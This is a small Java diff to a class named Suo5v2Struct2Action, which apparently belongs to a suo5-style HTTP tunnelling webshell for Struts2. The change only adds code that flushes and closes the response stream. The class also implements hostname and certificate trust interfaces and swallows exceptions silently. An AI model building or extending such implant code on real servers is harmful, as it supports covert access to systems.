@@ -164,7 +164,11 @@ public class Suo5v2Struct2Action implements Runnable, HostnameVerifier, X509Trus
             }
         } catch (Throwable e) {
         } finally {
-
+            try {
+                OutputStream out = resp.getOutputStream();
+                out.flush();
+                out.close();
+            } catch (Throwable ignored) {}
         }
     }
 
